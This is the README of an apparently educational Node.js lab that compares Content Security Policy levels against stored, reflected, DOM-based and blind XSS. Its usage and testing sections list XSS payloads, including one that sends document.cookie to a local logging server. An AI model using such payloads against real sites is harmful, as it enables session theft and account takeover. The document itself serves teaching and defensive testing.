# XSS vs CSP: Evaluating Content Security Policy Effectiveness Against XSS Attacks

## Project Description

This project demonstrates the impact of Cross-Site Scripting (XSS) vulnerabilities (Stored, Reflected, DOM-based, and Blind XSS) and evaluates the effectiveness of Content Security Policy (CSP) in mitigating these threats. Built with Node.js, Express, and EJS, it features a web application with four pages showcasing different CSP levels (No CSP, Basic, Moderate, Strict), an admin panel to highlight risks to privileged interfaces, and a Blind XSS logging server. The project serves as an educational resource for understanding XSS vulnerabilities and implementing secure web development practices.

## Features

- **XSS Demonstration Pages**: Four pages with varying CSP configurations to test Stored and Reflected XSS.
- **DOM-Based XSS Testing**: A dedicated page to showcase vulnerable and secure DOM manipulation methods.
- **Admin Panel**: Simulates a privileged interface vulnerable to Stored and Blind XSS.
- **Blind XSS Logging Server**: Captures and logs Blind XSS payloads for analysis.
- **Main Index Page**: A user-friendly entry point with a card-based interface linking to all components.

## Prerequisites

- Node.js (v14 or higher)
- npm (v6 or higher)

## Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/rishilidha/xss-vs-csp.git
   cd xss-vs-csp
   ```

2. Install dependencies:

   ```bash
   npm install
   ```

3. Start the application:

   ```bash
   npm start
   ```

   The web application will be accessible at `http://localhost:3000`, and the Blind XSS logging server will run on `http://localhost:9000`.

## Usage

1. **Explore XSS Demonstrations**:
   - Navigate to the main index page (`http://localhost:3000`) and access the CSP demonstration pages (No CSP, Basic, Moderate, Strict).
   - Test XSS payloads (e.g., `<script>alert('XSS')</script>`, `<img src="x" onerror="alert('XSS')">`) in the comment and Reflected XSS forms.
2. **Test DOM-Based XSS**:
   - Visit the DOM-based XSS page and experiment with vulnerable methods (e.g., `innerHTML`) and safe alternatives (e.g., `textContent`).
3. **Simulate Admin Panel Attacks**:
   - Access the admin panel to observe how Stored and Blind XSS payloads execute in a privileged context.
4. **Monitor Blind XSS**:
   - Inject Blind XSS payloads (e.g., `<img src="x" onerror="fetch('http://localhost:9000/log', {method: 'POST', body: JSON.stringify({data: document.cookie})})">`) and check the logging server (`http://localhost:9000/logs`) for captured data.

## Project Structure

- `views/`: Contains EJS templates for the web application (e.g., `no-csp.ejs`, `dom-xss-form.ejs`, `admin.ejs`).
- `public/`: Static assets (CSS, JavaScript) for styling and client-side logic.
- `index.js`: Main server file for the web application and Blind XSS logging server.
- `routes/`: Defines Express routes for different pages and functionalities.

## Testing

- Use browser developer tools to inspect CSP headers and payload execution.
- Test payloads provided in the project report (e.g., `<svg onload=alert('XSS')>`, `<div onclick="alert('XSS')">Click me</div>`).
- Verify Blind XSS logs via the `/logs` endpoint on the logging server.

## Demo

- GitHub Repository : https://github.com/rishiiiidha/xss-vs-csp
- Video Demo : https://drive.google.com/file/d/1dS5R73yPrv0dJ8hl6MBQsW8X-ZykkeHn/view

## Acknowledgments

- **Technologies**: Node.js, Express, EJS, CSS, JavaScript.
